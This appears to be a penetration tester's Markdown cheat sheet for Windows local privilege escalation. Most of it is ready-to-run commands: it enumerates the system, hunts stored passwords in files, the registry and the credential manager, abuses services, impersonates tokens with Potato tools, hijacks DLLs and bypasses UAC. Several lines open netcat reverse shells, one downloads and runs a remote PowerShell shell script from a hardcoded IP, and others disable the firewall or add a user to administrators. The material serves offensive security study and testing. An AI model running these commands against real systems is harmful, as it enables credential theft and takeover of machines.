# Priv-Esc Windows

## **Tools**

DOTNET CSHARP

* [SharpCollection](https://github.com/Flangvik/SharpCollection) (Full collection of compiled WinPEAS, SeatBelt, SharpUP, etc.)
* [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe) (Favorite so far)
* [Seatbelt](https://github.com/GhostPack/Seatbelt)
* [SharpUp](https://github.com/GhostPack/SharpUp)
* [Rubeus](https://github.com/GhostPack/Rubeus) (Kerberos exploitation)
* [Watson](https://github.com/rasta-mouse/Watson) (Kernel Exploitation)

POWERSHELL

* [JAWS](https://github.com/411Hall/JAWS)
* [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) (PowerUp)
* [Sherlock](https://github.com/rasta-mouse/Sherlock) (Kernel Exploitation - Depreciated, now use Watson)
* [WindowsEnum](https://github.com/absolomb/WindowsEnum)

EXE CLASSIC

* [Powerless](https://github.com/M4ximuss/Powerless)
* [BeRoot](https://github.com/AlessandroZ/BeRoot)
* [windows-privesc-check](https://github.com/pentestmonkey/windows-privesc-check)
* [WindowsExploits](https://github.com/abatchy17/WindowsExploits)

---

## **Basic info**

### System enumeration

OS name, arch, and version

```bat
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

wmic os get lastbootuptime
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%

hostname
C:\WINDOWS\System32\drivers\etc\hosts
```

List all env variables

```bat
Get-ChildItem Env: | ft Key,Value
```

List all drives

```bat
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername

Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

---

### User enumeration

Get current username

```bat
echo %USERNAME% || whoami
$env:username
```

List user privilege

```bat
whoami /priv
whoami /groups
```

List all users

```bat
qwinsta
net user
whoami /all

Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
```

List logon requirements; useable for bruteforcing

```bat
net accounts
```

Get details about a user \(i.e. administrator, admin, current user\)

```bat
net user administrator
net user admin
net user %USERNAME%
```

List all local groups

```bat
net localgroup

Get-LocalGroup | ft Name
```

Get details about a group \(i.e. administrators\)

```bat
net localgroup administrators

Get-LocalGroupMember Administrators | ft Name, PrincipalSource
Get-LocalGroupMember Administrateurs | ft Name, PrincipalSource
```

---

### Network enumeration

List all network interfaces, IP, and DNS.

```bat
ipconfig /all

Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

List current routing table

```bat
route print

Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

List the ARP table

```bat
arp -A

Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
```

List all current connections

```bat
netstat -ano
```

List firewall state and current configuration

```bat
netsh advfirewall firewall dump

netsh advfirewall firewall show rule name=all
netsh advfirewall export "firewall.txt"

netsh firewall show state
netsh firewall show config
```

List firewall's blocked ports

```bat
$f=New-object -comObject HNetCfg.FwPolicy2;$f.rules |  where {$_.action -eq "0"} | select name,applicationname,localports
```

Disable firewall

```bat
netsh firewall set opmode disable
netsh advfirewall set allprofiles state off
```

List all network shares

```bat
net share
```

SNMP Configuration

```bat
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
```

---

## **Password looting**

### Tools

```bat
- Seatbelt.exe

- PowerSploit
Get-CachedGPPPassword //For locally stored GP Files
Get-GPPPassword //For GP Files stored in the DC
Get-UnattendedInstallFile
Get-Webconfig
Get-ApplicationHost
Get-SiteListPassword
Get-RegistryAutoLogon

- msf
post/windows/gather/credentials/gpp
```

### Group Policy Preferences

```bat
dir C:\ProgramData\Microsoft\Group Policy\History\<DOMAIN>\Machine\Preferences\Groups\Groups.xml
dir \\<DOMAIN>\SYSVOL\\Policies\<DOMAIN>\MACHINE\Preferences\Groups\Groups.xml

Services\Services.xml
ScheduledTasks\ScheduledTasks.xml
Printers\Printers.xml
Drives\Drives.xml
DataSources\DataSources.xml
```

### Unattended Install files

```bat
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul

Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}

C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\System32\Sysprep\unattend.xml 
C:\Windows\System32\Sysprep\Panther\unattend.xml
```

### Credential manager

```bat
cmdkey /list
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\

Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

### In file name

```bat
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini

Get-ChildItem C:\* -include *.xml,*.ini,*.txt,*.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password"
```

### In file content

```bat
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config 2>nul
findstr /spin "password" *.* 2>nul
dir /s *pass* == *vnc* == *.config* 2>nul (lot of output)

Get-Childitem –Path C:\Users\ -Include *password*,*vnc*,*.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

### In registry

```bat
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows Autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP parameters
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy credentials
reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password


REG QUERY "HKLM\Software\Microsoft\FTH" /V RuleList

Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | select "Default*"
```

### In services

```bat
https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1
Import-Module <full_path>\SessionGopher.ps1;
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
> Full path is mandatory for Import-Module

### in Powershell history

```bat
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

---

## **Services**

### Tools

```bat
- SeatBelt.exe
- SharpUp.exe

- PowerSploit
Get-ServiceDetail
Get-ModifiableService | more
Invoke-ServiceAbuse

Get-ModifiableServiceFile | more
Write-ServiceBinary
```

### Manual exploit Binary Path

> Tested on Windows XP SP1

```bat
sc qc upnphost
sc config SSDPSRV start= auto
net start SSDPSRV
sc config upnphost binpath= "C:\nc.exe -nv [ip] [port] -e C:\WINDOWS\System32\cmd.exe"
sc config upnphost obj= ".\LocalSystem" password= ""
sc qc upnphost
net start upnphost
```

### Unquoted Service Paths

```bat
# Using PowerSploit
Get-ServiceUnquoted
Write-ServiceBinary -Name "GDCAgent' -Path "C:\GDCAgent.exe"

# Using WMIC
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\" |findstr /i /v """
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name

# Using sc
sc query
sc qc service name

# Look for Binary_path_name and see if it is unquoted.

#Metasploit
exploit/windows/local/trusted_service_path
#PowerSploit
SharpUp PowerUp
```

### AlwaysInstallElevated

```bat
# manual cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# PowerSploit
Import-Module Privesc
Get-RegistryAlwaysInstallElevated
Write-UserAddMSI
```

### What is running

```bat
tasklist /v
tasklist /v /fi "username eq system"
tasklist /SVC
wmic service list brief
net start
sc query
Get-Service
Get-Process
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
```

### Scheduled task

```bat
sc qc
schtasks /query /fo LIST /v /s <remote_computername>
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
dir C:\windows\tasks
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```

### Startup services

```bat
wmic startup get caption,command
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\R
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"

Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup
```

### Permissions

```bat
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name

icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "Everyone"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "Everyone"
icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"

icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "Everyone"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "Everyone"
icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users" 
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users"

cacls "c:\Program Files" /T | findstr Users

accesschk.exe -uwcqv "Everyone" * -accepteula
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Users" *
accesschk.exe -ucqv *
accesschk.exe -ucqv Spooler

```
> For Windows XP and 2003, use an older version of accesschk :

  - [Accesschk-2003-xp.exe](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

Interesting permissions to get shell

```bat
SERVICE_ALL_ACCESS (full access)
SERVICE_CHANGE_CONFIG (reconfigure binary)
WRITE_DAC (reconfigure permissions)
WRITE_OWNER (become owner, change permission)
GENERIC_WRITE (inherits SERVICE_CHANGE_CONFIG)
GENEROC_ALL (inherits SERVICE_CHANGE_CONFIG)
```

---

## **Kernel Exploitation**

### Tools

```bat
- msf
post/windows/gather/enum_patches

- https://github.com/rasta-mouse/Watson
- https://github.com/rasta-mouse/Sherlock
Find-AllVulns

- https://github.com/SecWiki/windows-kernel-exploits
- https://github.com/GDSSecurity/Windows-Exploit-Suggester
```

### Manual discovery

```bat
wmic qfe
wmic qfe get Caption,Description,HotFixID,InstalledOn
wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."
```

---

## **Insecure GUI apps**

Application running as SYSTEM allowing an user to spawn a CMD, or browse directories.

Example: "Windows Help and Support" \(Windows + F1\), search for "command prompt", click on "Click to open Command Prompt"

---

## **Abusing privileges**

- [Priv2Admin](https://github.com/gtworek/Priv2Admin) : primary token checklist
- [FullPowers](https://github.com/itm4n/FullPowers) : Enable all privs for service or network account

### Hot potato

- [https://foxglovesecurity.com/2016/01/16/hot-potato/](https://foxglovesecurity.com/2016/01/16/hot-potato/)

exe : [Potato.exe](https://github.com/foxglovesec/Potato)

```bat
Potato.exe -ip -cmd [cmd to run] -disable_exhaust true -disable_defender true
```

powershell : [Tater.ps1](https://github.com/Kevin-Robertson/Tater)

```bat
Invoke-Tater -Command "net localgroup administrators user /add"
```

### RottenPotato

**Token Impersonation**

- [RottenPotato](https://github.com/foxglovesec/RottenPotato) 
- [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG)

Incognito (Meterpreter)

```bat
getuid
getprivs
use incognito
list\_tokens -u
cd c:\temp\
execute -Hc -f ./rot.exe
impersonate\_token "NT AUTHORITY\SYSTEM"
```
TokenManipulation

```bat
Invoke-TokenManipulation -Enumerate
Invoke-TokenManipulation -ImpersonateUser -Username "lab\domainadminuser"
Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"
Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.7.253.6:82/Invoke-PowerShellTcp.ps1');\"};"
```
> For more details, see next cheatsheet : [Domain Escalation](08-domain-escalation.md)

### Juicy Potato

**abusing the golden privileges**

- [Juicy Potato releases](https://github.com/ohpe/juicy-potato/releases) 

> Juicy Potato doesn't work on Windows Server 2019 and Windows 10 1809 +.

```bat
Check the privileges of the service account, you should look for SeImpersonate and/or SeAssignPrimaryToken (Impersonate a client after authentication)

whoami /priv

Select a CLSID based on your Windows version, a CLSID is a globally unique identifier that identifies a COM class object
    Windows 7 Enterprise
    Windows 8.1 Enterprise
    Windows 10 Enterprise
    Windows 10 Professional
    Windows Server 2008 R2 Enterprise
    Windows Server 2012 Datacenter
    Windows Server 2016 Standard

Execute JuicyPotato to run a privileged command.

JuicyPotato.exe -l 9999 -p c:\interpub\wwwroot\upload\nc.exe -a "IP PORT -e cmd.exe" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}
JuicyPotato.exe -l 1340 -p C:\users\User\rev.bat -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
JuicyPotato.exe -l 1337 -p c:\Windows\System32\cmd.exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} -a "/c c:\users\User\reverse_shell.exe"
    Testing {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} 1337
    ......
    [+] authresult 0
    {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4};NT AUTHORITY\SYSTEM
    [+] CreateProcessWithTokenW OK
```

---

## **DLL hijacking**

Tools

```bat
- find missing dll
https://technet.microsoft.com/en-us/sysinternals/processmonitor.aspx

- PowerSploit
Find-ProcessDLLHijack
Find-PathDLLHijack
Write-HijackDll

- msf
exploit/windows/local/ikeext_service
```

```bat
dll missing search paths order :
    The directory from which the application is loaded
    C:\Windows\System32
    C:\Windows\System
    C:\Windows
    The current working directory
    Directories in the system PATH environment variable
    Directories in the user PATH environment variable
```

```bat
icacls C:\Perl64
```

---

## **Vulnerable Drivers**

- [DriverQuery](https://github.com/matterpreter/OffensiveCSharp/tree/master/DriverQuery)

```bat
driverquery
driverquery.exe /fo table
DriverQuery.exe --no-msft
```

---

## **Named Pipes**

Tools

```bat
- SeatBelt.exe
```

Manual

```bat
Find named pipes: [System.IO.Directory]::GetFiles("\\.\pipe\")
Check named pipes DACL: pipesec.exe <named_pipe>
Reverse engineering software
Send data throught the named pipe : program.exe >\\.\pipe\StdOutPipe 2>\\.\pipe\StdErrPipe
```

## UAC Bypass

```sh
# https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Invoke-EventVwrBypass.ps1
Invoke-EventVwrBypass -Command "powershell.exe <COMMAND>"
Invoke-EventVwrBypass -Command "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe <COMMAND>"
powershell.exe -ExecutionPolicy Bypass -c Import-Module -Name C:\Windows\temp\Invoke-EventVwrBypass.ps1;Invoke-EventVwrBypass -Command "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -enc IgBJAHMAIABFAGwAZQB2AGEAdABlAGQAOgAgACQAKAAoAFsAUwBlAGMAdQByAGkAdAB5AC4AUAByAGkAbgBjAGkAcABhAGwALgBXAGkAbgBkAG8AdwBzAFAAcgBpAG4AYwBpAHAAYQBsAF0AWwBTAGUAYwB1AHIAaQB0AHkALgBQAHIAaQBuAGMAaQBwAGEAbAAuAFcAaQBuAGQAbwB3AHMASQBkAGUAbgB0AGkAdAB5AF0AOgA6AEcAZQB0AEMAdQByAHIAZQBuAHQAKAApACkALgBJAHMASQBuAFIAbwBsAGUAKABbAFMAZQBjAHUAcgBpAHQAeQAuAFAAcgBpAG4AYwBpAHAAYQBsAC4AVwBpAG4AZABvAHcAcwBCAHUAaQBsAHQASQBuAFIAbwBsAGUAXQAnAEEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAJwApACkAIAAtACAAJAAoAEcAZQB0AC0ARABhAHQAZQApACIAIAB8ACAATwB1AHQALQBGAGkAbABlACAAQwA6AFwAVQBBAEMAQgB5AHAAYQBzAHMAVABlAHMAdAAuAHQAeAB0ACAALQBBAHAAcABlAG4AZAA="

# https://github.com/hfiref0x/UACME
msbuild "c:\projects\uacme\Source\uacme.sln" /verbosity:normal /logger:"C:\Program Files\AppVeyor\BuildAgent\Appveyor.MSBuildLogger.dll"
```

---

## **Refs**

- [https://book.hacktricks.xyz/windows/windows-local-privilege-escalation](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation) 
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Windows - Privilege Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

---

## **To check**

- Invoke-WCMDump -- Extracts crendentials from Credential Manager. Detected. 
- DomainPasswordSpray -- Spray gathered passwords across domain Inveigh -- 
- Inveigh is a PowerShell ADIDNS/LLMNR/mDNS/NBNS spoofer and man-in-the-middle tool.

